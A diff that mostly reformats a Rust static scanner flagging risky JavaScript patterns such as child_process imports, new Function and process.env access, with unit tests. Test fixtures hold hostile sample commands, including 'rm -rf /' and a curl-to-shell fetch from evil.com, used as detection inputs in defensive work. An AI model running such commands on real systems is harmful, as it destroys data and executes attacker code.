@@ -46,15 +46,10 @@ const DANGEROUS_NODE_BUILTINS: &[(&str, Severity)] = &[
 /// - `new Function(...)` constructor invocations
 /// - `process.env` member expressions (environment access)
 /// - `child_process.*` member expressions
-pub fn scan_js_ast(
-    root: &Path,
-    path: &Path,
-    source: &str,
-    indicators: &mut Vec<StaticIndicator>,
-) {
+pub fn scan_js_ast(root: &Path, path: &Path, source: &str, indicators: &mut Vec<StaticIndicator>) {
     let allocator = Allocator::default();
-    let source_type = SourceType::from_path(path)
-        .unwrap_or_else(|_| SourceType::default().with_module(true));
+    let source_type =
+        SourceType::from_path(path).unwrap_or_else(|_| SourceType::default().with_module(true));
 
     let ret = Parser::new(&allocator, source, source_type)
         .with_options(ParseOptions {
@@ -214,10 +209,15 @@ impl JsIndicatorVisitor<'_, '_> {
 
         for (builtin, severity) in DANGEROUS_NODE_BUILTINS {
             if bare == *builtin {
-                let summary = format!(
-                    "{import_kind}('{module_name}') — dangerous Node.js built-in module"
+                let summary =
+                    format!("{import_kind}('{module_name}') — dangerous Node.js built-in module");
+                self.emit(
+                    "js-ast-dangerous-import",
+                    severity.clone(),
+                    span_start,
+                    &summary,
+                    None,
                 );
-                self.emit("js-ast-dangerous-import", severity.clone(), span_start, &summary, None);
                 return;
             }
         }
@@ -292,61 +292,91 @@ mod tests {
     #[test]
     fn require_child_process_detected() {
         let types = scan("const cp = require('child_process');", "js");
-        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-dangerous-import".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn require_node_prefixed_detected() {
         let types = scan("const cp = require('node:child_process');", "js");
-        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-dangerous-import".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn require_safe_module_not_flagged() {
         let types = scan("const path = require('path');", "js");
-        assert!(!types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
+        assert!(
+            !types.contains(&"js-ast-dangerous-import".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn new_function_constructor_detected() {
         let types = scan("const f = new Function('return process.env');", "js");
-        assert!(types.contains(&"js-ast-function-constructor".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-function-constructor".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn dynamic_import_dangerous_module_detected() {
         let types = scan("const m = await import('child_process');", "js");
-        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-dangerous-import".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn dynamic_import_computed_source_detected() {
         let types = scan("const m = await import(moduleName);", "js");
-        assert!(types.contains(&"js-ast-dynamic-import".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-dynamic-import".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn es_import_from_child_process_detected() {
         let types = scan("import { exec } from 'child_process';", "js");
-        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-dangerous-import".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn process_env_detected() {
         let types = scan("const key = process.env.SECRET_KEY;", "js");
-        assert!(types.contains(&"js-ast-process-env".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-process-env".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn timer_with_string_arg_detected() {
         let types = scan(r#"setTimeout("eval('malicious')", 1000);"#, "js");
-        assert!(types.contains(&"js-ast-deferred-string-eval".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-deferred-string-eval".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
     fn timer_with_function_arg_not_flagged_as_string_eval() {
         let types = scan("setTimeout(() => doWork(), 100);", "js");
-        assert!(!types.contains(&"js-ast-deferred-string-eval".to_owned()), "{types:?}");
+        assert!(
+            !types.contains(&"js-ast-deferred-string-eval".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
@@ -356,7 +386,10 @@ import { exec } from 'child_process';
 const fn = (cmd: string) => exec(cmd);
 "#;
         let types = scan(source, "ts");
-        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-dangerous-import".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
@@ -366,7 +399,10 @@ const { execSync } = require('child_process');
 execSync('rm -rf /');
 "#;
         let types = scan(source, "js");
-        assert!(types.contains(&"js-ast-shell-exec-sync".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-shell-exec-sync".to_owned()),
+            "{types:?}"
+        );
     }
 
     #[test]
@@ -376,6 +412,9 @@ const { spawnSync } = require('child_process');
 spawnSync('bash', ['-c', 'curl http://evil.com | sh']);
 "#;
         let types = scan(source, "js");
-        assert!(types.contains(&"js-ast-shell-exec-sync".to_owned()), "{types:?}");
+        assert!(
+            types.contains(&"js-ast-shell-exec-sync".to_owned()),
+            "{types:?}"
+        );
     }
 }
